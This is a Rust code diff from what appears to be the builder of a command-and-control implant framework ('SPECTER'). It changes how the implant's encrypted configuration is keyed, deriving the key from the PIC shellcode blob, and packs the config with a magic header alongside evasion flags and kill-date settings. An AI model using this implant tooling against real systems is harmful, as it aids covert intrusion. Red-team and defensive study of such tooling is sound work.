@@ -107,6 +107,7 @@ pub fn generate_config(
         sleep_config,
         kill_date,
         EvasionFlags::default(),
+        &[],
     )
 }
 
@@ -117,6 +118,7 @@ pub fn generate_config_with_evasion(
     sleep_config: &SleepConfig,
     kill_date: Option<i64>,
     evasion: EvasionFlags,
+    pic_blob: &[u8],
 ) -> Result<GeneratedConfig, BuilderError> {
     if channels.is_empty() {
         return Err(BuilderError::Config(
@@ -181,9 +183,16 @@ pub fn generate_config_with_evasion(
         tlv_bytes(&mut plaintext, config_field::EVASION_FLAGS, &[evasion_byte]);
     }
 
-    // 4. Derive per-build encryption key from DH shared secret
-    let shared_secret = implant_secret.diffie_hellman(server_pubkey);
-    let encryption_key = derive_config_key(shared_secret.as_bytes());
+    // 4. Derive encryption key.
+    // The implant derives its key from SHA256(first 64 bytes of PIC blob).
+    // If we have the PIC blob, use the same derivation so the implant can decrypt.
+    // Otherwise fall back to ECDH shared secret (for stagers / tests).
+    let encryption_key = if pic_blob.len() >= 64 {
+        derive_pic_key(pic_blob)
+    } else {
+        let shared_secret = implant_secret.diffie_hellman(server_pubkey);
+        derive_config_key(shared_secret.as_bytes())
+    };
 
     // 5. Encrypt with ChaCha20-Poly1305
     let cipher = ChaCha20Poly1305::new_from_slice(&encryption_key)
@@ -192,14 +201,26 @@ pub fn generate_config_with_evasion(
     rand::thread_rng().fill_bytes(&mut nonce_bytes);
     let nonce = Nonce::from_slice(&nonce_bytes);
 
-    let ciphertext = cipher
+    let ciphertext_with_tag = cipher
         .encrypt(nonce, plaintext.as_slice())
         .map_err(|e| BuilderError::Config(format!("config encryption failed: {e}")))?;
 
-    // 6. Pack: [nonce (12)][ciphertext+tag]
-    let mut config_blob = Vec::with_capacity(12 + ciphertext.len());
-    config_blob.extend_from_slice(&nonce_bytes);
-    config_blob.extend_from_slice(&ciphertext);
+    // ChaCha20-Poly1305 appends 16-byte tag to ciphertext.
+    // Split into ciphertext and tag for the CONFIG_BLOB_HEADER format.
+    let tag_offset = ciphertext_with_tag.len() - 16;
+    let ciphertext = &ciphertext_with_tag[..tag_offset];
+    let tag = &ciphertext_with_tag[tag_offset..];
+
+    // 6. Pack as CONFIG_BLOB_HEADER + encrypted data:
+    // [magic: u32 LE][version: u32 LE][data_size: u32 LE][nonce: 12][tag: 16][ciphertext]
+    let data_size = ciphertext.len() as u32;
+    let mut config_blob = Vec::with_capacity(4 + 4 + 4 + 12 + 16 + ciphertext.len());
+    config_blob.extend_from_slice(&0x53504543u32.to_le_bytes()); // CONFIG_MAGIC "SPEC"
+    config_blob.extend_from_slice(&1u32.to_le_bytes()); // CONFIG_VERSION
+    config_blob.extend_from_slice(&data_size.to_le_bytes()); // data_size
+    config_blob.extend_from_slice(&nonce_bytes); // nonce (12 bytes)
+    config_blob.extend_from_slice(tag); // AEAD tag (16 bytes)
+    config_blob.extend_from_slice(ciphertext); // encrypted TLV data
 
     Ok(GeneratedConfig {
         config_blob,
@@ -208,10 +229,20 @@ pub fn generate_config_with_evasion(
 }
 
 /// Derive a 32-byte encryption key from the DH shared secret using SHA-256 with a domain tag.
+/// Used as fallback when PIC blob is not available (stagers, tests).
 fn derive_config_key(shared_secret: &[u8]) -> [u8; 32] {
     let mut hasher = Sha256::new();
     hasher.update(b"SPECTER_CONFIG_KEY_V1");
     hasher.update(shared_secret);
+    hasher.finalize().into()
+}
+
+/// Derive a 32-byte encryption key from the PIC blob, matching the implant's
+/// `cfg_derive_key()` in `config.c`: `SHA256(pic_base[0..64])`.
+fn derive_pic_key(pic_blob: &[u8]) -> [u8; 32] {
+    let input_len = pic_blob.len().min(64);
+    let mut hasher = Sha256::new();
+    hasher.update(&pic_blob[..input_len]);
     hasher.finalize().into()
 }
 
@@ -306,16 +337,32 @@ transform:
         )
         .expect("config generation should succeed");
 
-        // Derive the same shared secret the server would use
+        // Parse CONFIG_BLOB_HEADER
+        let blob = &result.config_blob;
+        let magic = u32::from_le_bytes([blob[0], blob[1], blob[2], blob[3]]);
+        assert_eq!(magic, 0x53504543, "CONFIG_MAGIC should be 'SPEC'");
+        let version = u32::from_le_bytes([blob[4], blob[5], blob[6], blob[7]]);
+        assert_eq!(version, 1);
+        let data_size = u32::from_le_bytes([blob[8], blob[9], blob[10], blob[11]]) as usize;
+        let nonce_bytes = &blob[12..24];
+        let tag = &blob[24..40];
+        let ciphertext = &blob[40..40 + data_size];
+
+        // Derive key via ECDH (no PIC blob provided → fallback path)
         let implant_pubkey = PublicKey::from(result.implant_pubkey);
         let shared_secret = server_secret.diffie_hellman(&implant_pubkey);
         let key = derive_config_key(shared_secret.as_bytes());
 
+        // Reconstruct ciphertext+tag for decryption (ChaCha20-Poly1305 expects appended tag)
+        let mut ct_with_tag = Vec::with_capacity(data_size + 16);
+        ct_with_tag.extend_from_slice(ciphertext);
+        ct_with_tag.extend_from_slice(tag);
+
         // Decrypt
-        let nonce = Nonce::from_slice(&result.config_blob[..12]);
+        let nonce = Nonce::from_slice(nonce_bytes);
         let cipher = ChaCha20Poly1305::new_from_slice(&key).unwrap();
         let plaintext = cipher
-            .decrypt(nonce, &result.config_blob[12..])
+            .decrypt(nonce, ct_with_tag.as_slice())
             .expect("decryption should succeed");
 
         // Verify TLV structure: walk entries
